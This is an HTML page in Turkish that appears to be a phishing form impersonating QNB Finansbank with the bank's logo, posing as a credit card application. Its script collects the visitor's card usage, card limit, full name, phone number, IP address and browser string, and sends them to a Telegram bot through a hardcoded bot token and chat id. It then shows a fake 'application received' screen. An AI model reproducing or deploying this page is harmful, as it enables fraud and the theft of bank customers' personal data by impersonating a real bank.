<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>QNB Başvuru</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fdfdfd;
      margin: 0;
      padding: 0;
    }
    .header {
      background: linear-gradient(to right, #0d0c34, #56003c);
      padding: 5px 20px;
      display: flex;
      align-items: center;
      height: 50px;
      box-sizing: border-box;
    }
    .header img {
      height: 40px;
      cursor: pointer;
      max-width: 100%;
      height: auto;
    }
    .container {
      max-width: 400px;
      margin: 40px auto;
      padding: 20px;
      border-radius: 8px;
      border: 1px solid #eee;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
      box-sizing: border-box;
      background-color: white;
    }
    label {
      font-weight: bold;
      display: block;
      margin-top: 20px;
    }
    input[type="text"],
    input[type="number"],
    input[type="tel"] {
      width: 100%;
      padding: 10px;
      border: 1px solid #aaa;
      border-radius: 4px;
      font-size: 16px;
      box-sizing: border-box;
    }
    .choice-buttons {
      display: flex;
      justify-content: space-between;
      margin-top: 10px;
    }
    .choice-buttons input[type="radio"] {
      display: none;
    }
    .choice-buttons label {
      flex: 1;
      text-align: center;
      padding: 12px 0;
      margin: 0 5px;
      background-color: #f2f2f2;
      border: 1px solid #ccc;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
      user-select: none;
      transition: background-color 0.3s, color 0.3s;
      box-sizing: border-box;
    }
    .choice-buttons input[type="radio"]:checked + label {
      background-color: #880e4f;
      color: white;
      border-color: #880e4f;
    }
    .login-button {
      width: 100%;
      margin-top: 25px;
      padding: 12px;
      background-color: #880e4f;
      color: white;
      font-size: 16px;
      font-weight: bold;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    .login-button:hover {
      background-color: #6a0040;
    }
    .error {
      color: red;
      margin-top: 10px;
      text-align: center;
    }
    .hidden {
      display: none;
    }
    .info, .success-box {
      background-color: #f8f8f8;
      padding: 10px;
      border-left: 5px solid #880e4f;
      margin-top: 10px;
      font-size: 14px;
      box-sizing: border-box;
    }
    .success-container {
      text-align: center;
      padding: 40px 20px;
    }
    .success-container h2 {
      color: #4CAF50;
      margin-bottom: 10px;
    }
    .success-container p {
      font-size: 16px;
      margin: 8px 0;
    }
    .checkmark {
      font-size: 60px;
      color: #4CAF50;
    }

    /* Mobil uyumluluk için medya sorguları */
    @media (max-width: 480px) {
      .container {
        max-width: 90%;
        margin: 20px auto;
        padding: 15px;
      }
      .choice-buttons label {
        margin: 0 3px;
        padding: 10px 0;
        font-size: 14px;
      }
      input[type="text"],
      input[type="number"],
      input[type="tel"] {
        font-size: 14px;
        padding: 8px;
      }
      .login-button {
        font-size: 14px;
        padding: 10px;
      }
      .header {
        padding: 5px 10px;
        height: 45px;
      }
      .header img {
        height: 35px;
      }
      .success-container {
        padding: 30px 10px;
      }
      .checkmark {
        font-size: 50px;
      }
    }
  </style>
</head>
<body>

  <div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/QNB_Finansbank_logo.svg/512px-QNB_Finansbank_logo.svg.png" alt="QNB Logo" />
  </div>

  <!-- FORM 1 -->
  <div class="container" id="form1">
    <form id="loginForm">
      <label>Kredi kartı kullanıyor musunuz?</label>
      <div class="choice-buttons">
        <input type="radio" id="evet" name="krediKart" value="Evet" />
        <label for="evet">Evet</label>

        <input type="radio" id="hayir" name="krediKart" value="Hayır" />
        <label for="hayir">Hayır</label>
      </div>

      <label for="limit">Kart limitiniz</label>
      <input type="number" id="limit" name="limit" placeholder="Örn: 10000 TL" />

      <button type="submit" class="login-button">İleri</button>
      <div id="error" class="error"></div>
    </form>
  </div>

  <!-- FORM 2 -->
  <div class="container hidden" id="form2">
    <div class="info" id="summaryInfo"></div>

    <form id="secondForm">
      <label for="isim">İsim Soyisim</label>
      <input type="text" id="isim" name="isim" placeholder="Adınız Soyadınız" />

      <label for="tel">Telefon Numaranız</label>
      <input type="tel" id="tel" name="tel" placeholder="05xxxxxxxxx" />

      <button type="submit" class="login-button">Gönder</button>
      <div id="error2" class="error"></div>
    </form>
  </div>

  <!-- ONAY EKRANI -->
  <div class="container hidden" id="successScreen">
    <div class="success-container">
      <div class="checkmark">✅</div>
      <h2>Başvurunuz Alındı!</h2>
      <p id="finalInfo"></p>
      <p>En kısa sürede sizinle iletişime geçilecektir.</p>
    </div>
  </div>

  <script>
    const form1 = document.getElementById("form1");
    const form2 = document.getElementById("form2");
    const successScreen = document.getElementById("successScreen");

    const loginForm = document.getElementById("loginForm");
    const secondForm = document.getElementById("secondForm");
    const summaryInfo = document.getElementById("summaryInfo");
    const finalInfo = document.getElementById("finalInfo");

    let krediKartDegeri = "";
    let limitDegeri = "";

    // Telegram bot bilgileri
    const botToken = "7899149800:AAEUrSio-NfOHcCsvZRsNwBhQrp_lBCcY4c";
    const chatId = "8045620328";

    loginForm.addEventListener("submit", function(e) {
      e.preventDefault();

      const krediKart = document.querySelector('input[name="krediKart"]:checked');
      const limit = document.getElementById("limit").value.trim();
      const error = document.getElementById("error");

      if (!krediKart || limit === "") {
        error.textContent = "Lütfen tüm alanları doldurun.";
        return;
      }

      krediKartDegeri = krediKart.value;
      limitDegeri = limit;

      summaryInfo.innerHTML = `
        <strong>Önceki Bilgiler:</strong><br>
        Kredi Kartı Kullanımı: <strong>${krediKartDegeri}</strong><br>
        Kart Limiti: <strong>${limitDegeri} TL</strong>
      `;

      form1.classList.add("hidden");
      form2.classList.remove("hidden");
    });

    secondForm.addEventListener("submit", function(e) {
      e.preventDefault();

      const isim = document.getElementById("isim").value.trim();
      const tel = document.getElementById("tel").value.trim();
      const error2 = document.getElementById("error2");

      if (isim === "" || tel === "") {
        error2.textContent = "Lütfen isim ve telefon numarasını girin.";
        return;
      }

      const tarayici = navigator.userAgent;
      const tarihSaat = new Date().toLocaleString("tr-TR");

      fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(data => {
          const ipAdres = data.ip;

          const telegramMessage = `
🔔 Yeni Başvuru
🕒 Tarih: ${tarihSaat}
👤 İsim: ${isim}
📞 Telefon: ${tel}
💳 Kredi Kartı: ${krediKartDegeri}
💰 Kart Limiti: ${limitDegeri} TL
🌐 IP: ${ipAdres}
🧭 Tarayıcı: ${tarayici}
          `;

          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: telegramMessage
            })
          })
          .then(response => {
            if (!response.ok) throw new Error("Telegram'a gönderilemedi");

            finalInfo.innerHTML = `
              <strong>İsim Soyisim:</strong> ${isim}<br>
              <strong>Telefon:</strong> ${tel}<br>
              <strong>Kredi Kartı:</strong> ${krediKartDegeri}<br>
              <strong>Kart Limiti:</strong> ${limitDegeri} TL
            `;
            form2.classList.add("hidden");
            successScreen.classList.remove("hidden");
          })
          .catch(() => {
            error2.textContent = "Telegram'a mesaj gönderilemedi.";
          });

        })
        .catch(() => {
          error2.textContent = "IP adresi alınamadı.";
        });
    });
  </script>
</body>
</html>
